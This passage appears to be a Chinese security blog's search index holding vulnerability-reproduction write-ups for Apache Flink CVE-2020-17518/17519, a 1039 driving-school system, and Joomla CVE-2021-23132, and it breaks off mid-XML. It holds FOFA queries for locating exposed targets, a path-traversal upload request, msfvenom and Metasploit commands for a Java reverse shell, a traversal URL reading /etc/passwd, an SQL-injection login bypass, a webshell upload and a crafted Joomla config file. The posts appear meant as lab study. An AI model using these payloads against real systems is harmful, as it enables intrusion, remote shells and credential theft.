<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Apache Flink CVE-2020-17519/17518 漏洞复现</title>
    <url>/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Apache-Flink&quot;
app&#x3D;&quot;Apache‐Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。在Apache Flink 1.5.1版本中引入了REST API，但其实现上存在多处缺陷，导致任意文件读取（CVE-2020-17519）和任意文件写入（CVE-2020-17518）漏洞<br>CVE-2020-17518攻击者利用REST API，可以修改HTTP头，将上传的文件写入到本地文件系统上的任意位置（Flink 1.5.1进程能访问到的）<br>CVE-2020-17519Apache Flink 1.11.0 允许攻击者通过JobManager进程的REST API读取JobManager本地文件系统上的任何文件（JobManager进程能访问到的）</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>CVE-2020-17518<br>Apache:Apache Flink: 1.5.1 - 1.11.2</p>
<p>CVE-2020-17519<br>Apache:Apache Flink: 1.11.0, 1.11.1, 1.11.2</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本次漏洞环境使用vulhub的docker环境搭建，vulhub下载地址：<br><a href="https://github.com/vulhub/vulhub/">https://github.com/vulhub/vulhub/</a><br>下载完成后传入装有docker和docker-compose环境的虚拟机，进入目录</p>
<pre class="line-numbers language-none"><code class="language-none">cd vulhub-master&#x2F;flink&#x2F;CVE-2020-17518&#x2F;
docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>拉取漏洞环境,出现”done”表示拉取成功<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>在浏览器输入<a href="http://your-ip:8081查看页面">http://your-ip:8081查看页面</a><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="CVE-2020-17518"><a href="#CVE-2020-17518" class="headerlink" title="CVE-2020-17518"></a>CVE-2020-17518</h4><p>访问<a href="http://your-ip:8081，找到Submit">http://your-ip:8081，找到Submit</a> New Job的Add New上传一个jar包，jar包可以在桌面新建一个压缩文件，将zip后缀修改为jar即可，然后抓包<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br>将请求包发送到repeater模块进行修改因为我们不知到当前的路径是什么，所以可以使用../切换到根目录因为我们不知到当前的路径是什么，所以可以使用../切换到根目录<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><strong>POC:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1
Host: IP:8081
User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0
Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*
Accept-Language: en-US,en;q&#x3D;0.5
Accept-Encoding: gzip, deflate
Referer: http:&#x2F;&#x2F;IP:8081
Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------209638986713202799301320123018
Content-Length: 260
Connection: close
-----------------------------209638986713202799301320123018
Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;111&quot;
Content-Type: application&#x2F;octet-stream

111

-----------------------------209638986713202799301320123018--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在容器中查看文件是否上传成功</p>
<pre class="line-numbers language-none"><code class="language-none">docker ps
docker exec -it [CONTAINER ID] &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>Flink 本身是没有鉴权的，并且它本身支持任意jar包上传并执行，所以可以通过上传jar包getshell<br>msf生成jar格式的马,lhost为kali的ip，lport为kali接收shell的端口</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p java&#x2F;shell_reverse_tcp lhost&#x3D;**.***.***.**  lport&#x3D;1234 -f jar &gt;&#x2F;home&#x2F;a.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br>启动msf接收shell</p>
<pre class="line-numbers language-none"><code class="language-none">msfconsole
use exploit&#x2F;multi&#x2F;handler
set payload java&#x2F;shell_reverse_tcp
set LHOST **.***.***.**
set LPORT 1234
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>到此为止关于公网vps监听就已经设置好了，等待上传shell jar文件的连接就好了<br>在Apache Flink中选择Add New，选择木马jar文件上传,点击刚刚上传的木马文件,选择submit<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>这时候在返回公网vps发现已经接收到了反弹的shell,不过这个shell权限不大<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"></p>
<h4 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h4><p>上面写入后要是不能进入docker查看这里可以利用CVE-2020-17519漏洞进行文件读取，在页面首页输入以下payload查看tmp目录下的文件<br><strong>URL:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip:8081&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252f111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>%252f为/的两次url编码<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>修改后面的payload改为查看etc下的passwd文件<br><strong>POC:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP:PORT&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>官方已发布安全版本，请及时下载升级至安全版本<br><a href="https://flink.apache.org/zh/downloads.html">https://flink.apache.org/zh/downloads.html</a></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.lele8.me/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://www.lele8.me/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a><br><a href="https://blog.csdn.net/qq_38154820/article/details/112792615">https://blog.csdn.net/qq_38154820/article/details/112792615</a><br><a href="https://www.cnblogs.com/khz521/p/14023011.html">https://www.cnblogs.com/khz521/p/14023011.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>2021.1</tag>
      </tags>
  </entry>
  <entry>
    <title>1039家校通SQL注入和后台GETSHELL</title>
    <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>登录接口</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;Comstye.aspx
&#x2F;Student&#x2F;StudentLogin.aspx
&#x2F;Teacher&#x2F;Index.aspx
&#x2F;admin&#x2F;login.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/1.png" alt="图片"><br>用户名密码均输入</p>
<pre class="line-numbers language-none"><code class="language-none">&#39; or &#39;&#39;&#x3D;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可进入后台<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/2.png" alt="图片"><br>登陆后可任意修改网站内容<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/3.png" alt="图片"></p>
<h4 id="上传点存在SQL注入"><a href="#上传点存在SQL注入" class="headerlink" title="上传点存在SQL注入"></a>上传点存在SQL注入</h4><h5 id="教练登录手机端存在SQL注入"><a href="#教练登录手机端存在SQL注入" class="headerlink" title="教练登录手机端存在SQL注入"></a>教练登录手机端存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;teacherphone&#x2F;teacherlogin.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/8.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/9.png" alt="图片"></p>
<h5 id="教练点评处存在SQL注入"><a href="#教练点评处存在SQL注入" class="headerlink" title="教练点评处存在SQL注入"></a>教练点评处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;Teacher&#x2F;TeacherPf.aspx?yid&#x3D;0030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/10.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/11.png" alt="图片"></p>
<h5 id="管理员后台增加分类处存在SQL注入"><a href="#管理员后台增加分类处存在SQL注入" class="headerlink" title="管理员后台增加分类处存在SQL注入"></a>管理员后台增加分类处存在SQL注入</h5><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;Product&#x2F;comstye2.aspx
&#x2F;admin&#x2F;yk&#x2F;Index.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/13.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/12.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/14.png" alt="图片"></p>
<h4 id="后台管理编辑器任意文件上传"><a href="#后台管理编辑器任意文件上传" class="headerlink" title="后台管理编辑器任意文件上传"></a>后台管理编辑器任意文件上传</h4><p>在后台选择产品分类模块，再点击上传图片<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/4.png" alt="图片"><br>Burp抓包重放数据模块，上传一个asp的大马，上传成功可以看到上传的地址<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/5.png" alt="图片"><br>访问路径，getshell<br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/6.png" alt="图片"><br><img src="/images/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/7.png" alt="图片"></p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时联系技术厂家对系统进行升级维护或打补丁</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://p1kaju.github.io/research/1039-HomeSchool-security-research/">https://p1kaju.github.io/research/1039-HomeSchool-security-research/</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>2014.7</tag>
      </tags>
  </entry>
  <entry>
    <title>Joomla! CVE-2021-23132 漏洞复现</title>
    <url>/2021/03/18/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Joomla&quot;
app&#x3D;&quot;Joomla&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，是全球知名的一套内容管理系统（CMS）。<br>本漏洞涉及到目录遍历及进一步导致的RCE漏洞。在Joomla! 3.0.0到3.9.24版本中，Joomla!的com_media组件配置允许被任意修改导致Web级别目录遍历，攻击者通过一系列操作，进一步会导致远程命令执行。</p>
<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N<br>漏洞等级：7.5 | 高危</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>3.0.0 &lt;= Joomla! &lt;= 3.9.24</p>
<h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p><a href="https://github.com/HoangKien1020/CVE-2021-23132">https://github.com/HoangKien1020/CVE-2021-23132</a></p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本次漏洞复现环境在本地搭建，首先从<a href="https://downloads.joomla.org/zh-cn/">官网</a>下载安装包，我这里使用了Joomla_3.9.22模板。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>直接在php集成环境下安装即可，附上<a href="https://www.bilibili.com/video/BV1Mt411A7V4?p=7">B站链接</a>。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"><br>Joomla！在安装过程中会提示新建超级管理员，当然，在该超级管理员权限下是可以直接getshell的，因为权限很大。<br>该漏洞是在一般普通管理员的身份下，存在网站目录下的任意文件目录遍历，而导致的远程代码执行漏洞。所以该漏洞的利用前提需要有一个普通管理员的权限。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在创建好系统后，进入后台管理，登录超级管理员用户，创建一个普通管理员用户（创建时勾选Administrator）。后面复现在该用户权限下实现目录遍历与RCE。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>首先以新创建的普通管理员身份登录系统。切换到“多媒体文件管理”。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>保存后，回到“多媒体文件管理”，可以看到这里可以操作整个web目录下的文件夹及文件。实现了目录遍历。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>然后进入到administrator/components/com_users目录下，删掉config.xml文件，并重新上传一个新的config.xml文件，其内容如下。</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;config&gt;
  &lt;fieldset 
    name&#x3D;&quot;user_options&quot;
    label&#x3D;&quot;COM_USERS_CONFIG_USER_OPTIONS&quot; &gt;
    &lt;field
      name&#x3D;&quot;allowUserRegistration&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;new_usertype&quot;
      type&#x3D;&quot;usergrouplist&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_DESC&quot;
      default&#x3D;&quot;2&quot;
      checksuperusergroup&#x3D;&quot;0&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;guest_usergroup&quot;
      type&#x3D;&quot;usergrouplist&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_DESC&quot;
      default&#x3D;&quot;1&quot;
      checksuperusergroup&#x3D;&quot;0&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;sendpassword&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_SENDPASSWORD_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_SENDPASSWORD_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;useractivation&quot;
      type&#x3D;&quot;list&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_USERACTIVATION_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_USERACTIVATION_DESC&quot;
      default&#x3D;&quot;0&quot;
      &gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNONE&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;COM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_SELFACTIVATION&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;2&quot;&gt;COM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_ADMINACTIVATION&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;mail_to_admin&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILTOADMIN_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILTOADMIN_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;0&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;captcha&quot;
      type&#x3D;&quot;plugins&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_CAPTCHA_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_CAPTCHA_DESC&quot;
      folder&#x3D;&quot;captcha&quot;
      filter&#x3D;&quot;cmd&quot;
      useglobal&#x3D;&quot;true&quot;
      &gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JOPTION_DO_NOT_USE&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;frontend_userparams&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JSHOW&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JHIDE&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;site_language&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_LANG_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_LANG_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;0&quot;
      showon&#x3D;&quot;frontend_userparams:1&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JSHOW&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JHIDE&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

    &lt;field
      name&#x3D;&quot;change_login_name&quot;
      type&#x3D;&quot;radio&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_DESC&quot;
      class&#x3D;&quot;btn-group btn-group-yesno&quot;
      default&#x3D;&quot;0&quot;
      &gt;
      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
    &lt;&#x2F;field&gt;

  &lt;&#x2F;fieldset&gt;

  &lt;fieldset
    name&#x3D;&quot;domain_options&quot;
    label&#x3D;&quot;COM_USERS_CONFIG_DOMAIN_OPTIONS&quot;
    &gt;

    &lt;field
      name&#x3D;&quot;domains&quot;
      type&#x3D;&quot;subform&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_DOMAINS_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_DOMAINS_DESC&quot;
      multiple&#x3D;&quot;true&quot;
      layout&#x3D;&quot;joomla.form.field.subform.repeatable-table&quot;
      formsource&#x3D;&quot;administrator&#x2F;components&#x2F;com_users&#x2F;models&#x2F;forms&#x2F;config_domain.xml&quot;
    &#x2F;&gt;
  &lt;&#x2F;fieldset&gt;

  &lt;fieldset
    name&#x3D;&quot;password_options&quot;
    label&#x3D;&quot;COM_USERS_CONFIG_PASSWORD_OPTIONS&quot; &gt;
    &lt;field
      name&#x3D;&quot;reset_count&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_DESC&quot;
      first&#x3D;&quot;0&quot;
      last&#x3D;&quot;20&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;10&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;reset_time&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_TIME_LABEL&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_FRONTEND_RESET_TIME_DESC&quot;
      first&#x3D;&quot;1&quot;
      last&#x3D;&quot;24&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;1&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;minimum_length&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_PASSWORD_LENGTH&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_PASSWORD_LENGTH_DESC&quot;
      first&#x3D;&quot;4&quot;
      last&#x3D;&quot;99&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;4&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;minimum_integers&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_INTEGERS&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_INTEGERS_DESC&quot;
      first&#x3D;&quot;0&quot;
      last&#x3D;&quot;98&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;0&quot;
    &#x2F;&gt;

    &lt;field
      name&#x3D;&quot;minimum_symbols&quot;
      type&#x3D;&quot;integer&quot;
      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_SYMBOLS&quot;
      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MINIMUM_SYMBOLS_DESC&quot;
      first&#x3D;&quot;0&quot;
      last&#x3D;&quot;98&quot;
      step&#x3D;&quot;1&quot;
      default&#x3D;&quot;0&quot;
    &#x2F;&gt;

    &lt;field
